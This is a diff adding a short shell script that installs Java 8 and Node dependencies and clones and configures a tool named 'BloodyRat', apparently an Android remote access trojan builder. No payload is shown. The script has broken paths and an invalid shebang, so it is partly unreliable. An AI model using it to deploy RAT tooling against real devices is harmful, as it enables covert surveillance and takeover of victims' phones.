@@ -1,0 +1,21 @@
+#! /data/data/com.termux/files/usr/bin
+
+T_aapt="exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" --use-aapt2 "' + '" -o "' + exports.apkBuildPath + '"';"
+
+sudo echo "deb http://security.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list && sudo apt update -y && sudo apt install openjdk-8-jdk
+
+if [[ `command -v git` && `command -v wget` && `command -v nodejs` && `command -v npm` ]]; then
+		dependencies=true		
+	else
+		pkgs=(git wget nodejs npm)
+		for pkg in "${pkgs[@]}"; do
+			type -p "$pkg" &>/dev/null || {
+			apt install "$pkg" -y 
+			}
+			done
+	fi	
+  
+  git clone https://github.com/Bhaviktutorials/BloodyRat --quiet /usr/share/BloodyRat
+  sudo update-alternatives --set java /usr/lib/jvm/java-8-openjdk*/jre/bin/java
+  sed -i s/exports.buildCommand.*/${T_aapt}/g /usr/share/BloodyRat/server/includes/const.js
+  cd ~/.BloodyRat/server && npm install
